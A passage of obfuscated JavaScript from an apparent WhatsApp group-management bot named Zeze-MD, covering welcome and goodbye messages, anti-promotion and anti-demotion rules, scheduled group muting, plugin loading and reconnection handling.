        _0x3d7e4 = '';
      }
      try {
        const _0x42a42b = await _0x435f24.groupMetadata(_0x137d61.id);
        if (_0x137d61.action == 'add' && (await _0x2261e1(_0x137d61.id, 'welcome')) == 'on') {
          let _0x52bb2a = "Zeze-MD";
          let _0x2dd83b = _0x137d61.participants;
          for (let _0x5b0b9d of _0x2dd83b) {
            _0x52bb2a += " \n𝐇𝐞𝐥𝐥𝐨 @" + _0x5b0b9d.split('@')[0x0] + " 𝐀𝐍𝐃 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐎𝐔𝐑 𝐆𝐑𝐎𝐔𝐏.🌟WELCOME to each of you! 🤗\nWhether you're here to learn, grow, share, or just vibe — you're in the right place. Let's build something awesome together, support one another, and make this space feel like home. 💬💡✨..⭐ \n\n";
          }
          _0x52bb2a += "> 𝐏𝐋𝐄𝐀𝐒𝐄 𝐑𝐄𝐀𝐃 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏 𝐃𝐄𝐒𝐂𝐑𝐈𝐏𝐓𝐈𝐎𝐍 𝐓𝐎 𝐀𝐕𝐎𝐈𝐃 𝐆𝐄𝐓𝐓𝐈𝐍𝐆 𝐑𝐄𝐌𝐎𝐕𝐄𝐃* ";
          _0x435f24.sendMessage(_0x137d61.id, {
            'image': {
              'url': _0x3d7e4
            },
            'caption': _0x52bb2a,
            'mentions': _0x2dd83b
          });
        } else {
          if (_0x137d61.action == "remove" && (await _0x2261e1(_0x137d61.id, "goodbye")) == 'on') {
            let _0x36c228 = "Hey everyone one of our member,\nJust wanted to say goodbye. It’s been great being part of this group🚮;\n";
            let _0x175708 = _0x137d61.participants;
            for (let _0x3f5307 of _0x175708) {
              _0x36c228 += '@' + _0x3f5307.split('@')[0x0] + "\n";
            }
            _0x435f24.sendMessage(_0x137d61.id, {
              'text': _0x36c228,
              'mentions': _0x175708
            });
          } else {
            if (_0x137d61.action == 'promote' && (await _0x2261e1(_0x137d61.id, "antipromote")) == 'on') {
              if (_0x137d61.author == _0x42a42b.owner || _0x137d61.author == conf.NUMERO_OWNER + "@s.whatsapp.net" || _0x137d61.author == decodeJid(_0x435f24.user.id) || _0x137d61.author == _0x137d61.participants[0x0]) {
                console.log("SuperUser case I do nothing");
                return;
              }
              ;
              await _0x435f24.groupParticipantsUpdate(_0x137d61.id, [_0x137d61.author, _0x137d61.participants[0x0]], "demote");
              _0x435f24.sendMessage(_0x137d61.id, {
                'text': '@' + _0x137d61.author.split('@')[0x0] + " has violated the anti-promotion rule, therefore both " + _0x137d61.author.split('@')[0x0] + " and @" + _0x137d61.participants[0x0].split('@')[0x0] + " have been removed from administrative rights.",
                'mentions': [_0x137d61.author, _0x137d61.participants[0x0]]
              });
            } else {
              if (_0x137d61.action == "demote" && (await _0x2261e1(_0x137d61.id, "antidemote")) == 'on') {
                if (_0x137d61.author == _0x42a42b.owner || _0x137d61.author == conf.NUMERO_OWNER + "@s.whatsapp.net" || _0x137d61.author == decodeJid(_0x435f24.user.id) || _0x137d61.author == _0x137d61.participants[0x0]) {
                  console.log("SuperUser case I do nothing");
                  return;
                }
                ;
                await _0x435f24.groupParticipantsUpdate(_0x137d61.id, [_0x137d61.author], "demote");
                await _0x435f24.groupParticipantsUpdate(_0x137d61.id, [_0x137d61.participants[0x0]], "promote");
                _0x435f24.sendMessage(_0x137d61.id, {
                  'text': '@' + _0x137d61.author.split('@')[0x0] + " has violated the anti-demotion rule by removing @" + _0x137d61.participants[0x0].split('@')[0x0] + ". Consequently, he has been stripped of administrative rights.",
                  'mentions': [_0x137d61.author, _0x137d61.participants[0x0]]
                });
              }
            }
          }
        }
      } catch (_0x33d3d1) {
        console.error(_0x33d3d1);
      }
    });
    async function _0x55522b() {
      const _0x1b68bb = require('node-cron');
      const {
        getCron: _0x2b77ef
      } = require("./bdd/cron");
      let _0x417183 = await _0x2b77ef();
      console.log(_0x417183);
      if (_0x417183.length > 0x0) {
        for (let _0x1c3d43 = 0x0; _0x1c3d43 < _0x417183.length; _0x1c3d43++) {
          if (_0x417183[_0x1c3d43].mute_at != null) {
            let _0x25c1bc = _0x417183[_0x1c3d43].mute_at.split(':');
            console.log("establishment of an automute for " + _0x417183[_0x1c3d43].group_id + " a " + _0x25c1bc[0x0] + " H " + _0x25c1bc[0x1]);
            _0x1b68bb.schedule(_0x25c1bc[0x1] + " " + _0x25c1bc[0x0] + " * * *", async () => {
              await _0x435f24.groupSettingUpdate(_0x417183[_0x1c3d43].group_id, 'announcement');
              _0x435f24.sendMessage(_0x417183[_0x1c3d43].group_id, {
                'image': {
                  'url': "./media/chrono.webp"
                },
                'caption': "Hello, it's time to close the group; Goodnight."
              });
            }, {
              'timezone': "Africa/Nairobi"
            });
          }
          if (_0x417183[_0x1c3d43].unmute_at != null) {
            let _0x5e5e66 = _0x417183[_0x1c3d43].unmute_at.split(':');
            console.log("etablissement d'un autounmute pour " + _0x5e5e66[0x0] + " H " + _0x5e5e66[0x1] + " ");
            _0x1b68bb.schedule(_0x5e5e66[0x1] + " " + _0x5e5e66[0x0] + " * * *", async () => {
              await _0x435f24.groupSettingUpdate(_0x417183[_0x1c3d43].group_id, "not_announcement");
              _0x435f24.sendMessage(_0x417183[_0x1c3d43].group_id, {
                'image': {
                  'url': './media/chrono.webp'
                },
                'caption': "Good morning; It's time to open the group."
              });
            }, {
              'timezone': "Africa/Nairobi"
            });
          }
        }
      } else {
        console.log("Crons have not been enabled");
      }
      return;
    }
    _0x435f24.ev.on('contacts.upsert', async _0xcf117a => {
      const _0x133f71 = _0x31e388 => {
        for (const _0x13dce3 of _0x31e388) {
          if (store.contacts[_0x13dce3.id]) {
            Object.assign(store.contacts[_0x13dce3.id], _0x13dce3);
          } else {
            store.contacts[_0x13dce3.id] = _0x13dce3;
          }
        }
        return;
      };
      _0x133f71(_0xcf117a);
    });
    _0x435f24.ev.on("connection.update", async _0x5d646f => {
      const {
        lastDisconnect: _0x289a1f,
        connection: _0x22df24
      } = _0x5d646f;
      if (_0x22df24 === "connecting") {
        console.log("ℹ️ Zeze MD is connecting...");
      } else {
        if (_0x22df24 === 'open') {
          console.log("✅ Zeze MD Connected to WhatsApp!");
          console.log('--');
          0x0;
          await baileys_1.delay(0xc8);
          console.log("------");
          0x0;
          await baileys_1.delay(0x12c);
          console.log("------------------/-----");
          console.log("Zeze MD is Online ✅\n\n");
          console.log("Loading Zeze Commands ...\n");
          fs.readdirSync(__dirname + "/zezeplugins").forEach(_0x76f21e => {
            if (path.extname(_0x76f21e).toLowerCase() == ".js") {
              try {
                require(__dirname + "/zezeplugins/" + _0x76f21e);
                console.log(_0x76f21e + " Installed Successfully✔️");
              } catch (_0x303bca) {
                console.log(_0x76f21e + " could not be installed due to : " + _0x303bca);
              }
              0x0;
              baileys_1.delay(0x12c);
            }
          });
          0x0;
          baileys_1.delay(0x2bc);
          var _0x152008;
          if (conf.MODE.toLocaleLowerCase() === "yes") {
            _0x152008 = "public";
          } else if (conf.MODE.toLocaleLowerCase() === 'no') {
            _0x152008 = 'private';
          } else {
            _0x152008 = "undefined";
          }
          console.log("Commands Installation Completed ✅");
          await _0x55522b();
          if (conf.DP.toLowerCase() === "yes") {
            await _0x435f24.sendMessage(_0x435f24.user.id, {
              'text': "      BOT RUNNING\n                ⁠              \n> 𝑫𝑬𝑽   :\nzeze_Tech\n> 𝑩𝑶𝑻   : \nZEZE-MD \n⁠⁠"
            });
          }
        } else {
          if (_0x22df24 == "close") {
            let _0x5641b3 = new boom_1.Boom(_0x289a1f?.["error"])?.['output']["statusCode"];
            if (_0x5641b3 === baileys_1.DisconnectReason.badSession) {
              console.log("Session id error, rescan again...");
            } else {
              if (_0x5641b3 === baileys_1.DisconnectReason.connectionClosed) {
                console.log("!!! connection closed, reconnection in progress ...");
                _0xaf480d();
              } else {
                if (_0x5641b3 === baileys_1.DisconnectReason.connectionLost) {
                  console.log("connection error trying to reconnect... ");
                  _0xaf480d();
                } else {
                  if (_0x5641b3 === baileys_1.DisconnectReason?.["connectionReplaced"]) {
                    console.log("connection replaced ,,, a session is already open please close it !!!");
                  } else {
                    if (_0x5641b3 === baileys_1.DisconnectReason.loggedOut) {
                      console.log("you are disconnected,,, please rescan the qr code please");
                    } else {
                      if (_0x5641b3 === baileys_1.DisconnectReason.restartRequired) {
                        console.log("reboot in progress ▶️");
                        _0xaf480d();
                      } else {
                        console.log("restart error  ", _0x5641b3);
                        const {
                          exec: _0x2d7a00
                        } = require("child_process");
                        _0x2d7a00("pm2 restart all");
                      }
                    }
                  }
                }
              }
            }
            console.log("hum " + _0x22df24);
            _0xaf480d();
          }
        }
      }
    });
    _0x435f24.ev.on('creds.update', _0x421bb2);
    _0x435f24.downloadAndSaveMediaMessage = async (_0x3681a5, _0x541c8d = '', _0xd9ddc6 = true) => {
      let _0x107fd6 = _0x3681a5.msg ? _0x3681a5.msg : _0x3681a5;
      let _0x14ca7a = (_0x3681a5.msg || _0x3681a5).mimetype || '';
      let _0x3fb549 = _0x3681a5.mtype ? _0x3681a5.mtype.replace(/Message/gi, '') : _0x14ca7a.split('/')[0x0];
      0x0;
      const _0x5bda42 = await baileys_1.downloadContentFromMessage(_0x107fd6, _0x3fb549);
      let _0x5f277b = Buffer.from([]);
      for await (const _0x1395bb of _0x5bda42) {
        _0x5f277b = Buffer.concat([_0x5f277b, _0x1395bb]);
      }
      let _0x1d0a35 = await FileType.fromBuffer(_0x5f277b);
      let _0x56c01a = './' + _0x541c8d + '.' + _0x1d0a35.ext;
      await fs.writeFileSync(_0x56c01a, _0x5f277b);
      return _0x56c01a;
    };
    _0x435f24.awaitForMessage = async (_0x53733d = {}) => {
      return new Promise((_0x4e6980, _0x55de53) => {
        if (typeof _0x53733d !== "object") {
          _0x55de53(new Error("Options must be an object"));
        }
        if (typeof _0x53733d.sender !== "string") {
          _0x55de53(new Error("Sender must be a string"));
        }
        if (typeof _0x53733d.chatJid !== "string") {
          _0x55de53(new Error("ChatJid must be a string"));
        }
        if (_0x53733d.timeout && typeof _0x53733d.timeout !== "number") {
          _0x55de53(new Error("Timeout must be a number"));
        }
        if (_0x53733d.filter && typeof _0x53733d.filter !== 'function') {
          _0x55de53(new Error("Filter must be a function"));
        }
        const _0x2fb9cf = _0x53733d?.['timeout'] || undefined;
        const _0x4ed975 = _0x53733d?.["filter"] || (() => true);
        let _0x26d5be = undefined;
        let _0x595891 = _0x598d18 => {
          let {
            type: _0x3b0780,
            messages: _0xd873e7
          } = _0x598d18;
          if (_0x3b0780 == "notify") {
            for (let _0x103dd2 of _0xd873e7) {
              const _0x22296d = _0x103dd2.key.fromMe;
              const _0x177d40 = _0x103dd2.key.remoteJid;
              const _0x5befe2 = _0x177d40.endsWith("@g.us");
              const _0x8f1727 = _0x177d40 == "status@broadcast";
              const _0x59da25 = _0x22296d ? _0x435f24.user.id.replace(/:.*@/g, '@') : _0x5befe2 || _0x8f1727 ? _0x103dd2.key.participant.replace(/:.*@/g, '@') : _0x177d40;
              if (_0x59da25 == _0x53733d.sender && _0x177d40 == _0x53733d.chatJid && _0x4ed975(_0x103dd2)) {
                _0x435f24.ev.off("messages.upsert", _0x595891);
                clearTimeout(_0x26d5be);
                _0x4e6980(_0x103dd2);
              }
            }
          }
        };
        _0x435f24.ev.on('messages.upsert', _0x595891);
        if (_0x2fb9cf) {
          _0x26d5be = setTimeout(() => {
            _0x435f24.ev.off("messages.upsert", _0x595891);
            _0x55de53(new Error("Timeout"));
          }, _0x2fb9cf);
        }
      });
    };
    return _0x435f24;
  }
  let _0x1725b6 = require.resolve(__filename);
  fs.watchFile(_0x1725b6, () => {
    fs.unwatchFile(_0x1725b6);
    console.log("update " + __filename);
    delete require.cache[_0x1725b6];
    require(_0x1725b6);
  });
  _0xaf480d();
}, 0x1388);
